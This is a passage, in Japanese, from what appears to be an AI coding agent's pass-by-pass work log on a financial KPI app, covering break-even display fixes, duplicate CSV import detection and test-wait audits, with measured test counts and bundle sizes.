**これは免除ではなく主張**で、`absent` の綴りが本当に無いことを確かめる (出すようになった日に鳴る)。★ **どの行もこのセッションで実測した事実だけを書いた** —— 測っていない面に「たぶん要らない」とは書かない。`no-members` の 2 つの `silent-but-correct` は実測 (レポートは `showsPerCapitaRow=false`・画面は 生産性の枠を `revenuePerCapita !== null` で丸ごと隠す) から来ている。対照 **4 方向すべて鳴り、種類ごとに 1 本ずつ当てた**: [reason] 書面の §1 から損益分岐点の断りを外す ❌1 / [wrong-reason] 常に「限界利益 ≤ 0」と言う ❌2 / [silent-but-correct] 画面の生産性の枠を常に描く ❌1 / [reason] レポートから売上 0 の断りを外す ❌1 —— **どの失敗も面と欠けた文を名指しし、`silent-but-correct` の失敗は台帳の `why` をそのまま刷る** (落ちた人がその場で理由を読める)。★ **27 行の台帳は作らなかった** —— `Note` の母集団を測ると `data/` に 27 本 + `*SheetNote` 5 本で、**5 本のうち 4 本は既に双子を持ち、双子の無い 1 本 (`noBepSheetNote`) はパス 387 の当のもの** (画面側は `bepDisplay` の副文という別の機構で果たしている)。つまり命名の対はほぼ埋まっており、残る 27 本を並べても大半が「画面だけ・それで正しい」になる —— **私が想像で埋める欄が増えるだけで、測った物は増えない** (パス 387 / 388 はどちらも想像が外れた)。数えるのは**振る舞い**にした。`typecheck` 緑・`npm test` **810 / 18,013**・`verify:all` exit 0 (`verify:arch` のユニットテスト数を 15101 → 15108 へ)。**実機は回していない** —— 出荷物が 1 byte も動いていないので (両方を組んで確かめた))・**2026-09-22 パス 388 後の計測: 11,937,660 B / 3,350,181 B (両方 +183 B** —— 空欄の原因を 2 つに分け、どちらを出すかを選ぶ判定を 1 つ置いた分 (`ZERO_REVENUE_BEP_REASON` の 1 文と `noBepReason` / `blankBepReason`)。`renderer/data/` は両ビルドが読むので LITE も同じだけ増える。**画面は黙ってはいなかった —— 原因を取り違えて案内していた。** パス 387 の直後に「断り × 面」の被覆を測り、残っていた 2 つの候補を実測で切り分けた:

| 断り | 書面 | レポート | 画面 |
| --- | --- | --- | --- |
| `zeroRevenueRatioNote` (売上 0 で比率が空欄) | ✅ | ✅ | **❌** |
| `zeroMembersPerCapitaNote` (一人当たりが空欄) | ✅ | **行そのものを出さない → 不要** | **同 (枠ごと隠す)** |

★ **`zeroMembersPerCapitaNote` は欠陥ではない** —— 実測で レポートは `showsPerCapitaRow=false`、画面も `生産性 (一人当たり)` の枠を `revenuePerCapita !== null` で**丸ごと隠す**。**空欄を出さない面に断りは要らない** (法則 `measure-before-claim`: 最初は「レポートも黙っている」と見立てたが、行が無いので黙っていて正しい。パス 387 と同じ取り違えを 2 度続けなかった)。★ **本物は画面の売上 0 で、しかも「無い」ではなく「違う」だった** —— 実測 (jsdom・売上 0 / 販管費 30 万の KPI 実績 1 件): **9 つのタイルが `—`** (平均注文単価 / 限界利益率 / 損益分岐点 (BEP) / 安全余裕率 / 収益性 / 安全性 / 資金繰り / 効率性 / 成長性) で、**画面が出す唯一の理由が** パス 386 で足した `NO_BEP_REASON`「限界利益が 0 以下です。どれだけ売っても固定費を回収できません。」だった (`hasBepReason=true` / 売上 0 の断りは `false`)。**売上前の事業 (費用を入れ、売上はまだ) にこれを出すと「変動費と単価を見直せ」と読める** —— 限界利益 = 0 なので文は偽ではないが、**直す所が違う**。同じ状態について書面とレポートは `zeroRevenueRatioNote` で正しい原因を言っていた。**直し**: 原因を選ぶ判定を `noBepReason` / `blankBepReason` の**1 か所**に置き、`bepDisplay` は`bep` 単体ではなく **`{ bep, contributionRatio }` を受け取る** —— 呼び手 4 か所 (経営サマリー 2 / KPI 実績 2) は器をそのまま渡すだけになる。★ **`revenue > 0` を写さない** —— `contributionRatio === null` ⟺ 売上 0 は**その欄の定義**であり、`OverviewPage` のコスト構造の枠が 2026-09-08 に「枠の条件は**値そのもの**で書く —— `revenue > 0` を写すと同じ規則が 2 か所に分かれる」と自分で書いている当のことである。`KpiMetrics` が売上高を持たないことも、この向きを選ぶ理由を補強する。★ **`blankBepReason` を分けたのは型のためだけではない** —— `bepDisplay` は非有限の枝の中で呼ぶので `null` を受けられず、`?? 既定` と書くと**そこが 2 つ目の選択**になる (面ごとに違う原因を言い始める元)。対照 **3 方向すべて鳴り、しかも両向きに鳴る**: 常に「限界利益 ≤ 0」へ戻す ❌3 (**新しい 3 件だけ**) / 常に「売上 0」へ ❌6 (**既存の限界利益の 6 件だけ**) / 条件を反転 ❌9 —— **2 つの理由がどちらも効いていることが、鳴る側の分かれ方で分かる**。`typecheck` 緑・`npm test` **809 / 17,998**・`verify:all` exit 0 (`verify:arch` のユニットテスト数を 15098 → 15101 へ)・`chain:verify` 緑。★ **閉じていない物 (測った)**: 書面は売上 0 のとき `zeroRevenueRatioNote` を出すが、その文が名指しするのは 8 つの**比率**で **`損益分岐点売上高` は入っていない** —— 空欄の説明としては 1 行足りない。文言は既存の検査が留めているので、直すなら別パスで測ってから。**2026-09-22 パス 387 後の計測: 11,937,477 B / 3,349,998 B (両方 +301 B** —— 損益分岐点が存在しないときの断りの 1 文と、書面の 2 か所の配線。**増分はほぼ日本語の 1 文**で、docblock は最小化で落ちる。`renderer/data/` は両ビルドが読むので LITE も同じだけ増える。**同じ状態について、相手に渡る書面だけが黙っていた** —— パス 386 で画面を直した直後に、同じ判断の他の面を測った。実測 (限界利益 ≤ 0 = 売上 100 万 / 変動費 120 万 / 固定費 30 万 で金融機関等提出用の書面を組む):

| 面 | 損益分岐点が存在しないことを、何と言うか |
| --- | --- |
| 画面 (経営サマリー / KPI 実績) | `—` + 「限界利益が 0 以下です。どれだけ売っても固定費を回収できません。」 (パス 386) |
| 経営レポート | 経営ハイライトの **critical** 所見として述べる (**実測で在った**) |
| **書面 (金融機関等提出用)** | **`―` だけ**。理由は書面のどこにも無い (`hasReasonAnywhere=false`) |

**パス 382 の逆向きである** —— あのときは画面が書面より弱かった。ここでは**いちばん重い面が最も弱かった** (この書面は「上記のとおり相違ありません。」で代表者名つきで終わる)。★ **しかも残っていた注記は算式なので、この状態では読み手に嘘を言う** —— 「固定費 ÷ 限界利益率」は*割った結果が空欄*だと読ませるが、実際は**割るべき点が存在しない**。空欄の理由が無ければ入力漏れと区別できない —— **これは書面自身が `zeroRevenueRatioNote` で既に使っている論法**で、§1 の但し書きの docblock が「『営業利益 △3,000 / 営業利益率 ―』を見た読み手が入力漏れと区別できるように」と書いている当のことである。**機構は在り、この 1 件だけ載っていなかった。****直し**: `noBepSheetNote(bep)` を `kpiActuals.ts` の判定の隣 (`NO_BEP_REASON` / `noBreakEvenNote` と同じ所) に置き、① §1 の但し書き (4 → **5 つ**) ② **参考 (水耕栽培の計画) の節の caption** が読む —— 後者も `損益分岐点売上高（月）` を持つので、**同じ書面の中で答え方を割らない** (パス 84 が規準として名指しした形)。★ **売上 0 のときは出さない** —— そのとき `bep` も非有限になるが `zeroRevenueRatioNote` のほうが情報量が多く、安全余裕率を二重に名指しする。`managementHighlights` も同じ理由で `if (k.revenue > 0)` を門にしており、**同じ判断を同じ向きで揃えた**。値は 1 つも変えていない (`―` のまま) —— 足したのは**理由**だけである。対照 **4 方向すべて鳴る**: `noBepSheetNote` を常に null ❌2 / §1 から外す ❌1 / 参考から外す ❌1 / 売上 0 の門を外す ❌1 (二重に名指しする)。★ **測って偽だった見立てを 1 つ捨てた** —— 最初は「経営レポートも理由を出していない」と見立て、`Number.isFinite(k.bep) ? yen(k.bep) : '—'` が手書きの写しであることまで確かめたが、**実測すると highlights 経由で critical の所見が入っていた** (法則 `measure-before-claim`)。レポートの手書きの写しは**今日の欠陥ではない**ので、そのままにして記録だけ残す。★ **自戒: 新しい検査の import を隣のファイルから丸ごと借り、`typecheck` だけが捕まえた** —— 使わない 11 個が `TS6133` で鳴った。**私は `typecheck` を「検査を書く前」に回していた**ので、検査ファイルは 1 度も型検査を通っていなかった (vitest は型を剥がすので 5 件とも緑)。パス 383 の重複 import と同じ家系で、**順序は「書いてから typecheck」**である。`npm test` **809 / 17,995**・`verify:all` exit 0 (`verify:arch` のユニットテスト数を 15093 → 15098 へ)・`chain:verify` 緑 (block 252)。**2026-09-22 パス 386 後の計測: 11,937,176 B / 3,349,697 B (両方 +62 B** —— 損益分岐点の「値と理由」の判定を `data/kpiActuals.ts` の `bepDisplay` **ただ 1 つ**へ寄せた分。`renderer` は両ビルドが読むので LITE も同じだけ増える。**KPI 実績画面が、事業として最も重い状態を「∞」と刷り、理由を 1 文も出していなかった** —— `computeKpiMetrics` は限界利益 ≤ 0 のとき `bep = Infinity` を返す (*どれだけ売っても固定費を回収できない*)。実測 (jsdom・売上 100 万 / 変動費 120 万 / 固定費 30 万 を 1 件): **KPI 実績は 損益分岐点 (BEP) を `∞`・副文を「比率 ∞」**とし理由は 0 文、**経営サマリーは同じ状態を `—` +「限界利益が 0 以下です。どれだけ売っても固定費を回収できません。」**と答えていた。**`∞` は「無限に安全」と読めるが、これは正反対の側である。** ★ **原因は写し** —— `KpiPage.tsx:67-68` が `pct` / `safeYen` の**局所の双子**を持ち、どちらも非有限を `'∞'` へ倒していた。`shared/formatters.ts` の `pct` (パス 229) と `jpy` (パス 198) には**どちらにも `—` の床が在る**のに、局所の双子を通るのでその床が掛からなかった (法則 `center-then-count-callers`)。★ **しかも同じファイルがその規則を自分で述べていた** —— `pctOrDash` の注記が「**`pct` の '∞' に倒さない** —— 安全余裕率に ∞ を出すと『無限に安全』と読めるが…最も危ない側である」と書き、適用されていたのは**安全余裕率だけ**で、BEP の値と比率は素の `∞` のままだった。★ **`OverviewPage.tsx:132` の表は偽だった** —— 「損益分岐点 (BEP) | `∞` (`safeYen` — **パス 198 で「—」に直した**)」と書いていたが、今日の実測で `safeYen` はまだ `'∞'` を返していた (**散文が先に直り、コードが残っていた**)。★ **さらに検査が弱さを仕様として留めていた** —— `noBreakEvenOnScreen.test.ts` の `it('★ タイルは「∞」と「—」のまま (値の側の答え方は変えていない)')` が `expect(t).toContain('∞')` を持っていた。題名はパス 59 の**範囲**を述べる印だったが、主張として置かれている限り**直すと落ちる門**である (法則 `no-weakness-as-spec`)。**直し**: ① `bepDisplay(bep, money, sub?)` を `data/kpiActuals.ts` の `finiteBep` / `noBreakEvenNote` の隣へ置き、**値と理由を 1 つの判定から返す** (別々に書くと「— なのに理由が出ない」形が型の上で開く・パス 57)。**整形は呼び手が渡す** —— 金額の綴りが画面ごとに違う (`Intl` の `￥` と `jpy` の `¥`) ので、`demoMixNote(p, yen)` と同じ形にした ② 両画面の 4 枚 (KPI 2 / 経営サマリー 2) がそれを読む ③ 局所の双子の床も `DASH` へ ④ 弱さを留めていた `it` を「—」+ 理由へ反転。母集団は `bepAnswerParity.test.ts` (9 件) が**走査で導いて**両方向の台帳と突き合わせ、行ごとに `via` (`bepDisplay` / `own`) を持つ —— **株数のタイルは `own` で正しい** (金額でなく株数・上流は `Infinity` ではなく `null`・理由の文も単位に合わせて別で、パス 84 がこれを**規準**として名指しした当の物である)。★ **針を 1 度直した: `[^>]*` で切れて KpiPage の 2 枚が映らなかった** —— `{...bepDisplay(x, (n) => f(n))}` の**矢印の `>`** でタグが終わっていた (パス 375 が `<input\b[^>]*?>` で踏んだ死角と同じ家系)。波括弧の深さを数える形にし、**その形の標本**と複数行の標本を置いた。対照 **3 方向鳴る**: `bepDisplay` の「—」の枝を消す ❌7 (3 ファイル) / KpiPage のタイルを局所の双子へ戻す ❌2 / 台帳から 1 行消す ❌1。★ **鳴らなかった対照も記録する** —— 局所の `pct` / `safeYen` の床を `'∞'` へ戻しても **39 件すべて緑**。BEP のタイルが `bepDisplay` を通るようになったので、**今日この 2 つに非有限が届く呼び手は 1 つも無い** (実測: `safeYen` の残る 8 か所は売上・純資産・運転資本などの有限な和、`pct` の残る呼び手は `pctOrDash` 経由で `null` を先に落とす)。つまりこの床は**罠を外した**もので生きた欠陥を直した物ではない —— それでも残すのは、金融の画面に「非有限なら ∞ と刷る」既定を置いたままにすると、次に非有限が届く呼び手が 1 つ増えた日に黙って `∞` が出るからである。`typecheck` 緑・`npm test` **808 / 17,990**・`verify:all` exit 0 (`verify:arch` のユニットテスト数を 15084 → 15093 へ引き直した)・`chain:verify` 緑 (block 252)。**出荷物が動いたので実機も回した**: `perf` OK (LITE DCL 202 ms / heap 10.3 MB・FULL DCL 567 ms / heap 37 MB)・`e2e` **455 件 ❌ 0**・`e2e:lite` **455 件 ❌ 0**)・**2026-09-21 パス 385 後も 11,937,114 B / 3,349,635 B で byte 単位で不変** (直したのは `__tests__/` 3 本と `scripts/audit-tick-sensitivity.cjs` の台帳だけ —— **どちらも出荷物に入らない**。両方を組んで実測した。台帳を **3 → 0 本**へ消化し、**固定回数の待ちに依る検査が 1 本も残っていない状態にした** —— `npm run audit:tick-sensitivity` の実測で **0 周で落ちるのは 0 本 / 78 本 (双方向)**。母集団も 81 → 78 本 (3 本とも `settle()` ごと消えたので走査から外れる)。★ **台帳の `why` が 4 度目に偽だった** —— `investmentDemoMixOnScreen` は `text-captured` (「`const t = text();` へ取ってから主張するので待ちに渡せない」) と分類されていたが、0 周の失敗 5 件は**すべて置いた記録が届いていないこと**で、**取る前に待てばよく、取ったあとの主張 (否定を含む) はそのままでよい**。`overviewHydroponics` / `parameterWiring` の `setup-flush` も「条件で待っても、遷移が起きていなければ待てない」と書いていたが偽で、**遷移は起きていて、ただ待っていなかっただけ**である (パス 380 / 382 / 383 に続く 4 度目)。★ **ただし 1 つだけ本当に「待っても直らない」形が在った** —— `parameterWiring` の改善提案 2 件は、**押した瞬間の有効値で payload を組む一度きりの計算**なので、既定値で走り切ったあとに待っても文言は変わらない (0 周では寄せ済みの `waitForText` が 5 秒で時間切れになった)。**待つ場所は押す前**である。★ **錠を「主張そのもの」にしない形を 1 つ作った** —— `parameterWiring` は上書きを seed してから画面を描くので、「上書きが効いたか」で待つと*待ちが主張を飲み込む* (パス 379)。検査対象の画面と**同じ root** に `useParameters()` を読むだけの観測子 (`ParamProbe`) を並べ、`seed()` が置いた件数が属性に出るのを待つ —— 購読は 1 度の通知で両方を起こし React が 1 commit にまとめるので、**観測子が件数を出した時点で画面も同じ上書きを持つ**。文字は出さない (属性だけ) ので `text()` や枠の走査に 1 字も混ざらない。**これが偽陽性でないことは対照で確かめた**: `resolveParameters` が上書きを無視するようにすると (= 観測子は件数を出すが値は効かない) **❌23** 落ちる。★ **自戒: 私の錠の文面が、生きた値を名乗って死んだ値を出していた** —— `settleUntil` の label に `(いま ${JSON.stringify(probe())})` と書いたが、label は**呼び出しの時点で組まれる template** なので、落ちた理由を読む人は 5 秒後ではなく**描いた直後の姿 (`"loading"`)** を見る。対照を回して初めて気付いた (`"loading"` の理由が分からず製品側を疑ったが、原因は私の label だった)。`catch` で読み直す形へ直すと 同じ対照が **`観測子の値: "0"`** と生きた値を出す —— **パス 382 の e2e が ❌ の隣に期待値を刷っていたのと同じ形**で、`waitForText` は最初からこの形で書かれていた。★ **鳴らない対照が 2 つ在り、どちらも報せだった**: ① `finiteBep` を壊しても `overviewHydroponics` は 25 件とも緑 —— **`OverviewPage` は `finiteBep` を読んでいない** (自前の `bepDisplay` を持つ)。当てるべき物へ当て直すと **❌3**。**この鳴らなさが KPI 画面の欠陥を教えた** (残作業 #66 として実測つきで登録した: 限界利益 ≤ 0 の期で KPI 画面は損益分岐点を **`∞` / 比率 ∞** と刷り理由も出さないが、経営サマリーは同じ状態を `—` + 「限界利益が 0 以下です。どれだけ売っても固定費を回収できません。」と答える。`KpiPage.tsx:67-68` が `pct` / `safeYen` の**局所の双子**を持ち、どちらも非有限を `'∞'` へ倒す —— `shared/formatters.ts` の両方には `—` の床が在る。しかも `OverviewPage.tsx:132` の表は「`safeYen` — パス 198 で「—」に直した」と書いており、**その主張は今日の実測と食い違う**)。② `removeCrop` の「最後の 1 品目」の床を外しても 25 件とも緑 —— 検査は**ボタンが無効であること**を主張してから押すので、無効なボタンの onClick は発火せず純関数の床に届かない (床の検査は `hydroponicCrops.test.ts` が別に持つ・分業として正しい)。★ **床を 1 つ実測へ直した** —— 台帳が 0 本になっても `tickSensitivityLedger` は動かない (パス 382 が行数の床をやめ「別の綴りで数えた行数と一致すること」にした設計が、初めて 0 本で効いた)。対照 **5 方向すべて鳴る**: `resolveParameters` が上書きを無視 ❌23 / `overridesFromRecords` が保存を捨てる ❌24 / `bepDisplay` の「—」の枝を消す ❌3 / `demoMixNote` が常に 0 件の枝 ❌2 / `addCrop` が一覧を増やさない ❌4。`typecheck` 緑・`npm test` **807 / 17,981** (`it()` は 1 つも増減していない)・`verify:all` exit 0・`chain:verify` 緑。**実機は回していない** —— 出荷物が 1 byte も動いていないので (両方を組んで確かめた))・**2026-09-21 パス 384 後の計測: 11,937,114 B / 3,349,635 B (両方 +555 B** —— 判定の相手を「購読の写し」から**保管層の読み直し**へ移した分 (`data/readCollectionNow.ts` と断りの 1 文、4 か所の配線)。`renderer` は両ビルドが読むので LITE も同じだけ増える。**CSV の重複の判定が、一覧が届く前だと丸ごと働かなかった** —— `SalesPage.onImportFile` は `salesFromCsv(text, entries)` の `entries` に `useCollection` の**購読の写し**を渡していた。写しは一覧が IndexedDB から届く前は空なので `stored = 0` / `allStored = false` になり、**同じファイルを 2 度読んでも断られない**。実測 (0 周の probe で再現・対照で確定): 画面は「2 件を取り込みました」だけを出し、**総売上が ￥500 → ￥1,000 と倍**になった —— 断りの句も「同じファイルを 2 度読んだ」の拒否も 1 文も出ない。**パス 126 が直した欠陥 (同じ CSV を 2 度読むと売上高と受注件数が 2 倍になり、金融機関等提出用の書面 §2『売上高（販売記録）』まで届く) が、読み込み順の窓から戻っていた。**★ **`loading` を見るだけでは足りない** —— `useCollection` は読みが失敗しても `loading` を落とし (「読み込み中…」を永遠に出さないため) `records` は空のまま残るので、**画面からは「空」と「読めなかった」が区別できない**。★ **母集団を測ったら 1 件ではなかった** —— handler の中で写しを判定へ渡す所は **4 か所 / 3 画面** (`SalesPage.onImportFile` / `KpiPage.onImportCsv` / `KpiPage.onAdd` / `ShopifyPage.onRecord`)。KPI は重複行を**捨てる**側なので、写しが空だと同じ (期間, 事業) の 2 件目が入って**合算される** (同じファイルの `onAdd` が「2 件目を入れると合算される」と書いている当のこと)。Shopify は e2e の「★ 同じ注文名の 2 度目は断られ」が見ている当の関門である。直しは 1 つの口 `readCollectionNow<T>(collection)` (行を返す / 読めなければ `null`) へ寄せ、**`null` を「重複が無い」と混ぜずに断る** (パス 313 / 352 と同じ規則・断りは `unreadableForJudgementNote` が 1 つ持つ)。母集団は `snapshotJudgementCensus.test.ts` が handler を走査して両方向の台帳と突き合わせ、**`judgement` が 0 件であること**と、判定を持つ 3 画面が `readCollectionNow` を読んでいることを要求する。★ **針は名前しか見ない** —— `addMany(entries)` の `entries` は解析した CSV の行であって購読ではないので、`local` として理由つきで分類した (針は出所を見分けられない。だから分類は人が書き、「判定は 0 件」は import の要求が別に保つ)。対照 **4 方向すべて鳴る**: 写し (`entries`) へ戻す ❌1 (**画面が総売上 ￥1,000 を出す**) / 読みを常に失敗させる ❌4 / 断りの枝を消す ❌1 / census の判定を写しへ戻す ❌2。★ **監査が私の入れた退行を捕まえた** —— 取り込みに非同期の段が1 つ増えたので `importSizeGuard` の KPI の対照が 0 周で `expected +0 to be 1` になった (`npm run audit:tick-sensitivity` が「台帳に無いファイル」として鳴らした)。**KPI の取り込みは成功しても何も言わない** (`setError(errors.length > 0 ? … : undefined)`) ので、待てる印は一覧の行そのもの (`2026-04`) だった。★ **新しい検査が既存の門に捕まった** —— `recordStoreIsolation` が「`_resetRecordStoreForTests()` は singleton を捨てるだけで IndexedDB は残る」と言うとおりで、共有の `resetRecordStore()` へ寄せた。★ 台帳は `salesDuplicateImport` を消化して **4 → 3 本**。検証は `npm run audit:tick-sensitivity` で実測: **0 周で落ちるのは 3 本 / 81 本で、台帳どおり (双方向)**。`typecheck` 緑・`npm test` **807 / 17,981**・`verify:all` exit 0・`chain:verify` 緑。**出荷物が動いたので実機も回した**: `perf` OK (LITE DCL 193 ms / heap 10.2 MB・FULL DCL 553 ms / heap 37 MB)・`e2e` **455 件 ❌ 0**・`e2e:lite` **455 件 ❌ 0**。**残り 3 本**: `setup-flush` 2 / `text-captured` 1)・**2026-09-21 パス 383 後も 11,936,559 B / 3,349,080 B で byte 単位で不変** (直したのは `__tests__/` 4 本と `scripts/audit-tick-sensitivity.cjs` の台帳だけ —— **どちらも出荷物に入らない**。両方を組んで実測した。台帳を **8 → 4 本**へ消化し、**`setup-flush` を 7 → 3 本**へ減らした (`mutualFundsCostUnentered` / `mutualFundsYtdUnentered` / `mutualFundsImpossibleReturn` / `teamLastOwner`)。★ **台帳の `why` が 3 度目に偽だった** —— `setup-flush` の `why` は「落ちるのは主張ではなく**操作**の側」「**条件で待っても、遷移が起きていなければ待てない**」と書いていた。0 周で測ると、落ちているのは**helper が「まだ画面に出ていない物」を探して死ぬこと**で、それは条件で待てる —— `holding "E2Eファンド" was not added` / `row "復元ファンド" not found` / `role select for 一人目 not found` の 3 形だった。**4 本とも mount と押す helper に条件待ちを取らせるだけで寄せ終わった** (0 周でも落ちない)。パス 380 (「道具の限界」と書いてあった) とパス 382 (`text-with-message` と分類されていたが原因は mount) に続く 3 度目で、**分類は「見た形」であって「測った原因」ではない**。★ **錠の置き先は 3 通りに分かれた**: ① 追加フォームの欄が出ること (`mutualFunds` 2 本の mount) ② **その `it` が置いた行が一覧に出ること** (`mutualFundsImpossibleReturn` は `seedHolding` が保管層へ直接入れるので `mount(waitFor)` に名前を渡す) ③ **保管層の値** (`teamLastOwner` の降格は成功しても画面に文が出ないので、DOM に待てる印が無い —— `settleUntilAsync` で 'owner' → 'member' を待つ。**増える一方の値にだけ使う**決まりに当てはまる一方向の変化である)。★ **自戒: 重複した import を足し、検査は緑のまま `typecheck` だけが捕まえた** —— 3 ファイルに既に `waitForText` の import が在り、私はそれを見ずに `import { waitForElement, waitForText }` を足した。**vitest は型を剥がすので 18 件とも緑**で、`TS2300: Duplicate identifier` が 6 件出たのは `npm run typecheck` だけである (CLAUDE.md が「型の誤りを捕まえる網はこれ 1 つ」と書いている当のこと)。★ **残り 3 本の `why` も実測へ直した** —— 「条件で待てない」という偽の理由をやめ、0 周での失敗の件数と**何が届いていないか**を書いた (`overviewHydroponics` 17 件 = 品目の追加・削除が届かない / `parameterWiring` 14 件 = 上書きの seed が届かず 2 件は寄せた `waitForText` が 5 秒で時間切れ / `salesDuplicateImport` 2 件 = CSV の取り込みが流れない)。**どれも寄せられる** —— 25〜40 件と大きいので未着手であることも書いた (「できない」と「まだしていない」を混ぜない)。対照 **4 方向すべて鳴る**: `canChangeRole` を常に true へ ❌2 (1 件は私の `waitForText` が**何を待っていたかを名指しして** 5,143ms で落ちる) / `isImpossibleReturnPct` を常に false へ ❌3 / 未入力の年初来リターンを 0% として入れる ❌1 / 取得額の未入力を取得原価に入れる ❌2。検証は `npm run audit:tick-sensitivity` で実測: **0 周で落ちるのは 4 本 / 82 本で、台帳どおり (双方向)**。`typecheck` 緑・`npm test` **805 / 17,970**・`verify:all` exit 0・`chain:verify` 緑。**残り 4 本**: `setup-flush` 3 / `text-captured` 1)・**2026-09-21 パス 382 後の計測: 11,936,559 B / 3,349,080 B (両方 +679 B** —— 経営サマリーの断りに「手で置いた値」を名指しする節を足し、断る条件を `staleDerived`(結果) から `overridden`(事実) へ移した分。`renderer` は両ビルドが読むので LITE も同じだけ増える。**画面の断りが書面より弱かった** —— 門が `applied.staleDerived.length > 0` だったので、実測すると**上書きできる 45 欄のうち 28 欄は誰の計算元でもない** (`derivedFrom` で参照されていない) ため、その 28 欄を手で置くと `staleDerived` は空になり**画面はこの節ごと出さなかった**。書面 (`bankSubmission`) とレポート (`managementReport`) は `manualOverrideNote` を `overridden.length > 0` で出すので **45 欄すべてで断る** —— つまり**画面の断りだけが条件を取り違えて 28 欄で黙っていた**。いちばん重いのは比率で、営業利益率を手で置くと画面の Tile は 99.9% を自動計算と見分けられない形で出し、書面だけが「手で置いた数値です」と言っていた (`manualOverrideNote` の画面側の読み手は **0 件**だった)。★ **そしてそれが検査に映らなかった理由も実測した** —— `manualOverrideDisclosure` の ★ 画面の錠は `expect(t).toContain('50,000,000')` に `// 手で置いた売上高` と注記していたが、画面 11,868 字のうち `50,000,000` は**ちょうど 1 か所**で、それは消費税の注記「簡易課税は基準期間の課税売上高 ￥50,000,000 以下」—— **上書きの有無で同じ**。しかも `overview.kpi.revenue` の描画は **0 件**なので、置いた売上高はこの画面に出ていない。**落ちようがない錠で、見ていると称する物は画面に無かった。** ★ **自戒: 最初の枠組みは偽だった** —— 「利用者は置いた値を見る手段が無い」と述べたが、`ManualDataSection` (`data-overridden` の「手入力 50,000,000 円」) は **`App.tsx` が描く**ので実機では見える。検査が画面を単独で mount していただけで、**測り直して初めて本物の非対称 (28 欄) が出た** (法則 `measure-before-claim`)。直しは `applyOverrides` が `placed` (path / label / value / unit) を返し、画面が `formatMetric` で刷る —— **値は適用する瞬間に取る** (後から器をパスで歩き直すと同じ数の 2 つ目の導出になり、しかも歩き直す側は `.tsx` = 変異検査の外に出る)。対照 **4 方向すべて鳴る**: 門を `staleDerived` へ戻す ❌1 / `placed` を空へ ❌6 / 描画を潰す ❌2 / 上書きを効かなくする ❌4。★ **同じパスで e2e の欠陥が 1 つ出た** —— `e2e` が `sales: ★ 同じ注文名の 2 度目は断られ、売上集計は 1 行のまま` で ❌ を出しながら、**文面には「実際 1 行」= 期待どおりの値**を刷った。`ok()` が同じ locator を **2 度** `count()` しており、1 度目 (判定) は `#sales` へ移った直後でまだ 0 行、2 度目 (文面) では 1 行になっていた。原因は待ちで、隣の funds / KPI は最初から `waitForSelector` で行を待っており、**画面をまたぐこの 1 本だけが待っていなかった**。2 つ直した: ① 行が出るのを待ってから数える (★ 待つのは「1 行になること」ではなく「**1 行目が出ること**」—— 2 行になる欠陥のとき前者は 2 行目が来る前に通る・パス 380 の教訓) ② **数えるのは 1 度だけ**にして判定と文面が同じ値を使う (4 か所。残る 2 か所は別々の locator を数える行なので矛盾しえない)。★ 台帳を **10 → 8 本**へ消化し **`text-with-message` を空にした** (`libraryCorruptContent` / `manualOverrideDisclosure`)。第 2 引数の説明は**待ちの label へ移す** (説明が要る主張はたいてい「押しても画面が変わらない」で、それは*待ち切れなかったこと*として現れるから、label に書けばいちばん要る場面で出る)。★ **台帳の `kind` は落ちる理由ではなかった (2 度目)** —— `libraryCorruptContent` は `text-with-message` と分類されていたが、0 周の失敗は 5 件すべて `mountLibrary()` の側 (IndexedDB の一覧が届く前に当てていた) で、第 2 引数とは無関係だった。★ **床が 2 度目に「直した日に落ちる門」として鳴った** —— `tickSensitivityLedger` の `rows.length >= 10` は、その注記自身が「実測の行数に張り付けると直した日に落ちる」と警告しているのに実測に張り付いており、パス 378 (25 → 20) とパス 382 (10 → 8) で**2 度**その通りに落ちた。**行数の床をやめ**、`ledgerRows` が読んだ行数が**別の綴りで数えた行数と一致すること**にした (台帳が 0 本になっても動かず、針が実物に当たらなくなった日に鳴る)。対照: `kind` の針からハイフンを落とす ❌1。★ **鳴らなかった対照も記録する** —— `why` に escape した引用符を入れる形は鳴らない。それは欠陥ではなく `ledgerRows` が最初からその形を扱えるためで、**鳴らない対照はその検査についての報せ**である。検証は `npm run audit:tick-sensitivity` で実測: **0 周で落ちるのは 8 本 / 86 本で、台帳どおり (双方向)**。`typecheck` 緑・`npm test` **805 / 17,970**・`verify:all` exit 0・`chain:verify` 緑。**出荷物が動いたので実機も回した**: `perf` OK (LITE DCL 157 ms / heap 10.3 MB・FULL DCL 426 ms / heap 36.8 MB)・`e2e` **455 件 ❌ 0**・`e2e:lite` **455 件 ❌ 0**。**残り 8 本**: `setup-flush` 7 / `text-captured` 1。★ **記録を 1 つ訂正した** —— パス 380 / 381 の記録は残りの内訳を「`setup-flush` 6」と書いていたが実物は **7** (`mutualFundsCostUnentered` / `mutualFundsImpossibleReturn` / `mutualFundsYtdUnentered` / `overviewHydroponics` / `parameterWiring` / `salesDuplicateImport` / `teamLastOwner`)。合計 (14 / 10) は正しく、内訳だけが 1 ずれて**足しても合わなかった**)・**2026-09-21 パス 381 後も 11,935,880 B / 3,348,401 B で byte 単位で不変** (直したのは `__tests__/` 4 本と `scripts/audit-tick-sensitivity.cjs` の台帳だけ —— **どちらも出荷物に入らない**。両方を組んで実測した。台帳を **14 → 10 本**へ消化し、**`attribute` / `hook-state` / `mock-call` の 3 分類を空にした** (`balanceSheetCurrent` / `parameterOverrides` / `plaintextBackupNotice` / `restorePlan`)。★ **錠は画面の文でなくてよい** —— 属性を持つ行の数 (`tr[data-bs-row]`)・hook の戻り (`loading` / 上書きの件数)・**呼ばれたこと自体** (`confirm.mock.calls.length >= 1`) が錠になる。`parameterOverrides` は**画面を持たない** (`Harness` が hook を ref へ写すだけ) ので `waitForText` が使えず、`settleUntil(() => ref.current?.loading === false)` が唯一の形だった。★ **呼び出し回数を錠にするのは「呼ばれる」側だけ** —— `restorePlan` の置換の確認は**やめた場合に画面へ何も出ない**ので下流の文では待てず、待てる印は呼び出しそのものである。逆に `plaintextBackupNotice` の対照「個人情報が無ければ確認しない」は**呼ばれないこと**の主張なので、肯定の文 (「1 件のレコードをバックアップしました（平文）」) を先に待ってから見る (パス 380 の教訓の適用)。★ **対照を 4 方向とも実際に回した**: `BackupPanel` の確認 2 つを迂回 ❌2 (どちらも `5000ms 待っても「…」にならなかった` と**何を待っていたかを名指しして**落ちる)・`currentBalanceSheet` を「最後に入力した控え」へ戻す ❌2・`overridesFromRecords` を空へ倒す ❌6。★ **自戒: 一括置換の script が 1 つ黙って失敗した** —— `parameterOverrides` の `settle()` は**私が数えた 6 か所ではなく 9 か所**在り (grep を `head -30` 